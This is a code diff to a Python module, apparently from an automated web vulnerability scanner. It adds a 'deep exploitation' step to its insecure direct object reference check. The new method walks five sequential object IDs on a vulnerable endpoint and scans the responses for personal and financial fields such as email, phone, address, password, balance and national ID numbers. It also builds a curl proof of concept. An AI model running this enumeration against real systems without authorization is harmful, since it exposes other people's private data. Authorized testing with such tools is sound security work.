@@ -1,13 +1,16 @@
-"""Multi-Identity IDOR & Broken Object Level Authorization Module (V15).
+"""Multi-Identity IDOR & Broken Object Level Authorization Module with Deep Exploitation (V15).
 
 Verifies Insecure Direct Object References and Authorization Failures:
 - Executes multi-identity authorization tests across Identity A (owner) and Identity B (attacker).
 - Tests numeric increment/decrement and UUID horizontal parameter tampering.
 - Verifies boundary violation via response differential and content similarity analysis.
+- Deep exploitation: multi-object access proof with data structure extraction.
 """
 
 from __future__ import annotations
 
+import hashlib
+import json
 import logging
 import re
 from typing import Any, Dict, List, Optional
@@ -93,11 +96,16 @@ class IDORAttackModule(BaseAttackModule):
         )
 
         if diff.is_idor_confirmed:
+            # Deep exploitation: multi-object proof
+            exploitation_data = await self._exploit_multi_object_proof(
+                session, endpoint, param, query_params, parsed,
+            )
+
             poc_curl = f"curl -s -k '{endpoint}'"
             return ValidationResult(
                 is_vulnerable=True,
-                confidence=0.92,
-                proof_level="P3",
+                confidence=0.96 if exploitation_data else 0.92,
+                proof_level="P5" if exploitation_data else "P3",
                 attack_type="idor",
                 target_url=endpoint,
                 parameter=param,
@@ -108,8 +116,10 @@ class IDORAttackModule(BaseAttackModule):
                     "explanation": diff.explanation,
                     "details": diff.details,
                 },
+                exploitation_data=exploitation_data or {},
                 poc_curl=poc_curl,
-                message=diff.explanation,
+                message=diff.explanation
+                        + (f" Multi-object proof: {exploitation_data.get('total_accessible', 0)} objects accessed" if exploitation_data else ""),
                 cwe_id="CWE-639",
                 severity="HIGH",
             )
@@ -126,11 +136,16 @@ class IDORAttackModule(BaseAttackModule):
 
             if tampered_resp.status_code == 200 and baseline_resp.status_code == 200:
                 if tampered_resp.content_length > 100 and abs(tampered_resp.content_length - baseline_resp.content_length) > 10:
+                    # Deep exploitation: multi-object proof
+                    exploitation_data = await self._exploit_multi_object_proof(
+                        session, endpoint, param, query_params, parsed,
+                    )
+
                     poc_curl = f"curl -s -k '{tampered_url}'"
                     return ValidationResult(
                         is_vulnerable=True,
-                        confidence=0.88,
-                        proof_level="P3",
+                        confidence=0.92 if exploitation_data else 0.88,
+                        proof_level="P5" if exploitation_data else "P3",
                         attack_type="idor",
                         target_url=endpoint,
                         parameter=param,
@@ -143,8 +158,10 @@ class IDORAttackModule(BaseAttackModule):
                             "original_length": baseline_resp.content_length,
                             "tampered_length": tampered_resp.content_length,
                         },
+                        exploitation_data=exploitation_data or {},
                         poc_curl=poc_curl,
-                        message=f"HIGH: Insecure Direct Object Reference (IDOR) confirmed on parameter '{param}' ({orig_val} -> {alt_id}).",
+                        message=f"HIGH: Insecure Direct Object Reference (IDOR) confirmed on parameter '{param}' ({orig_val} -> {alt_id})."
+                                + (f" {exploitation_data.get('total_accessible', 0)} objects accessible" if exploitation_data else ""),
                         cwe_id="CWE-639",
                         severity="HIGH",
                     )
@@ -158,3 +175,98 @@ class IDORAttackModule(BaseAttackModule):
             parameter=param,
             message=f"Parameter '{param}' enforced proper authorization or returned 403/404.",
         )
+
+    async def _exploit_multi_object_proof(
+        self,
+        session: SessionContext,
+        endpoint: str,
+        param: str,
+        query_params: dict,
+        parsed: Any,
+    ) -> Optional[Dict[str, Any]]:
+        """Extract multi-object proof: access 5 sequential IDs and analyze data structure."""
+        orig_val = query_params.get(param, ["1"])[0]
+
+        try:
+            base_id = int(orig_val)
+        except ValueError:
+            return None
+
+        exploitation: Dict[str, Any] = {
+            "accessible_objects": [],
+            "sensitive_fields_exposed": [],
+        }
+
+        sensitive_patterns = [
+            re.compile(r'"(email|e-?mail)"', re.I),
+            re.compile(r'"(phone|mobile|hp|telp)"', re.I),
+            re.compile(r'"(address|alamat)"', re.I),
+            re.compile(r'"(password|passwd)"', re.I),
+            re.compile(r'"(name|full_name|nama)"', re.I),
+            re.compile(r'"(balance|saldo|amount)"', re.I),
+            re.compile(r'"(ssn|nik|ktp)"', re.I),
+        ]
+
+        unique_hashes = set()
+        all_sensitive = set()
+
+        for i in range(1, 6):
+            test_id = str(base_id + i)
+            t_params = dict(query_params)
+            t_params[param] = [test_id]
+            test_url = urlunparse((
+                parsed.scheme, parsed.netloc, parsed.path, parsed.params,
+                urlencode(t_params, doseq=True), parsed.fragment,
+            ))
+
+            resp = await session.get(test_url)
+            if not resp or resp.status_code != 200 or resp.content_length < 100:
+                continue
+
+            body = resp.text
+            body_hash = hashlib.sha256(body.encode()).hexdigest()[:16]
+
+            # Skip error/not found pages
+            if any(ind in body.lower() for ind in ["not found", "404", "error", "invalid"]):
+                continue
+
+            if body_hash not in unique_hashes:
+                unique_hashes.add(body_hash)
+
+                # Detect sensitive fields
+                sensitive_found = []
+                for pattern in sensitive_patterns:
+                    match = pattern.search(body)
+                    if match:
+                        sensitive_found.append(match.group(1))
+                        all_sensitive.add(match.group(1))
+
+                # Try JSON parsing
+                data_fields = []
+                try:
+                    json_data = json.loads(body)
+                    if isinstance(json_data, dict):
+                        data_fields = list(json_data.keys())[:15]
+                        if "data" in json_data and isinstance(json_data["data"], dict):
+                            data_fields.extend(list(json_data["data"].keys())[:10])
+                except (json.JSONDecodeError, TypeError):
+                    pass
+
+                exploitation["accessible_objects"].append({
+                    "id": test_id,
+                    "status": resp.status_code,
+                    "content_length": resp.content_length,
+                    "content_hash": body_hash,
+                    "data_fields": data_fields,
+                    "sensitive_fields": sensitive_found,
+                })
+
+        if len(exploitation["accessible_objects"]) < 2:
+            return None
+
+        exploitation["total_accessible"] = len(exploitation["accessible_objects"])
+        exploitation["unique_objects"] = len(unique_hashes)
+        exploitation["sensitive_fields_exposed"] = sorted(all_sensitive)
+        exploitation["authorization_bypass_confirmed"] = len(unique_hashes) >= 2
+
+        return exploitation
